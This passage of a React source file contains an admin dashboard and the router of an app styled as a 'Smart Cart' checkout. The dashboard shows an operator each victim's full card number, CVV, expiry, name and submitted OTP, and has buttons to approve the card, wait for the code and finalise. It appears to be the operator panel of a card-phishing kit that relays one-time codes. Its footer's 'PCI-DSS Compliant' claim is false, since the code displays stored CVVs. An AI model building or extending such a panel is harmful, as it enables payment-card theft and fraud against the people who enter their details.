                    <div className="flex justify-between pb-1.5 border-b border-slate-900/60 bg-cyan-950/25 px-2 py-1.5 rounded border border-cyan-500/15 animate-pulse">
                      <span className="text-cyan-400 font-bold">USER SUBMITTED OTP:</span>
                      <span className="text-cyan-300 font-black text-sm tracking-widest">{selectedTx.submittedOtp}</span>
                    </div>
                  )}
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60 bg-indigo-950/25 px-2 py-1.5 rounded border border-indigo-500/15">
                    <span className="text-indigo-400 font-bold">GENERATED OTP CODE:</span>
                    <span className="text-emerald-400 font-black text-sm tracking-widest">{selectedTx.otpCode || 'N/A'}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">TX ID:</span>
                    <span className="text-indigo-400 font-bold">{selectedTx.id}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">AMOUNT:</span>
                    <span className="text-emerald-400 font-bold">${selectedTx.amount.toFixed(2)} USD</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">CARD BRAND:</span>
                    <span className="text-white font-semibold uppercase">{selectedTx.cardType}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">CARD NUMBER:</span>
                    <span className="text-white font-semibold">{selectedTx.cardNumber}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">HOLDER:</span>
                    <span className="text-white font-semibold truncate max-w-[180px]">{selectedTx.cardholderName.toUpperCase()}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">EXP DATE:</span>
                    <span className="text-white font-semibold">{selectedTx.expiry}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">CVV CORE:</span>
                    <span className="text-white font-semibold">{selectedTx.cvv}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">TIMESTAMP:</span>
                    <span className="text-white font-semibold text-[10px]">
                      {new Date(selectedTx.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">DECISION STATE:</span>
                    <span className={`font-black uppercase tracking-wider ${
                      selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
                      selectedTx.status === 'REJECTED' ? 'text-rose-400' :
                      selectedTx.status === 'AWAITING_OTP' ? 'text-indigo-400' : 
                      selectedTx.status === 'OTP_SUBMITTED' ? 'text-cyan-400 animate-pulse' : 'text-amber-400'
                    }`}>
                      {selectedTx.status === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : selectedTx.status === 'AWAITING_OTP' ? 'AWAITING OTP' : selectedTx.status === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : selectedTx.status}
                    </span>
                  </div>
                </div>

                {/* Audit lock/decision CTA triggers */}
                {selectedTx.status === 'PENDING_CARD_APPROVAL' ? (
                  <div className="space-y-2 pt-2">
                    <div className="text-[10px] text-slate-500 font-mono text-center uppercase tracking-widest bg-slate-950 py-1 rounded">
                      STAGE 1: EVALUATE CARD
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <button
                        onClick={() => handleUpdateStatus('REJECTED')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-200"
                      >
                        REJECT CARD
                      </button>
                      <button
                        onClick={() => handleUpdateStatus('AWAITING_OTP')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-emerald-500/20 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-emerald-500/10 transition duration-200"
                      >
                        APPROVE CARD
                      </button>
                    </div>
                  </div>
                ) : selectedTx.status === 'OTP_SUBMITTED' ? (
                  <div className="space-y-2 pt-2">
                    <div className="text-[10px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/20 py-1 rounded border border-cyan-500/15 animate-pulse">
                      STAGE 2: VERIFY SUBMITTED OTP
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <button
                        onClick={() => handleUpdateStatus('REJECTED')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-200"
                      >
                        REJECT
                      </button>
                      <button
                        onClick={() => handleUpdateStatus('APPROVED')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-emerald-500/20 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-emerald-500/10 transition duration-200"
                      >
                        FINAL APPROVE
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="rounded-xl border border-dashed border-slate-800 p-4 text-center">
                    <p className="text-[11px] font-mono text-slate-500">
                      This transaction is locked at state{' '}
                      <span className={`font-bold ${
                        selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
                        selectedTx.status === 'REJECTED' ? 'text-rose-400' : 'text-indigo-400'
                      }`}>
                        {selectedTx.status === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : selectedTx.status === 'AWAITING_OTP' ? 'AWAITING OTP' : selectedTx.status}
                      </span>
                      . To reset queue logs:
                    </p>
                    <button
                      onClick={() => handleUpdateStatus('PENDING_CARD_APPROVAL')}
                      disabled={actionBusy}
                      className="mt-2 inline-flex items-center space-x-1 text-[10px] font-mono text-slate-400 hover:text-white underline transition"
                    >
                      <span>Reset to Pending state</span>
                    </button>
                  </div>
                )}

              </div>
            ) : (
              <div className="py-16 text-center">
                <ShieldCheck className="h-10 w-10 mx-auto text-slate-600 mb-2 animate-pulse" />
                <p className="text-sm font-bold text-slate-400">Ledger Auditing Desk</p>
                <p className="text-xs text-slate-600 mt-1 font-mono">
                  Select transactional logs from left panel to execute administrative status audits.
                </p>
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
};

// Root Router wrapper
export default function App() {
  return (
    <HashRouter>
      <div className="min-h-screen bg-slate-950 font-sans text-slate-200 antialiased selection:bg-indigo-500/30 selection:text-white">
        
        {/* Floating gradient ambient background orbs */}
        <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
          <div className="absolute top-[-10%] left-[-15%] w-[50%] h-[50%] rounded-full bg-indigo-900/15 blur-[120px]" />
          <div className="absolute bottom-[10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-emerald-900/10 blur-[100px]" />
        </div>

        <div className="relative z-10 flex flex-col min-h-screen">
          <Header />
          
          <main className="flex-grow">
            <Routes>
              <Route path="/" element={<CheckoutPage />} />
              <Route path="/waiting" element={<WaitingApprovalPage />} />
              <Route path="/otp" element={<OTPPage />} />
              <Route path="/success" element={<SuccessPage />} />
              <Route path="/dashboard" element={<AdminDashboard />} />
              <Route path="/admin-portal" element={<AdminPortal />} />
            </Routes>
          </main>

          <footer className="border-t border-slate-900 bg-slate-950 py-6 text-center text-[11px] font-mono text-slate-500">
            <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col sm:flex-row justify-between items-center gap-2">
              <p>© 2026 Smart Cart secure transaction services. Powered by Google AI Studio.</p>
              <div className="flex space-x-3 text-slate-600">
                <span>SHA-256 Enabled</span>
                <span>•</span>
                <span>PCI-DSS Compliant</span>
              </div>
            </div>
          </footer>
        </div>

      </div>
    </HashRouter>
  );
}
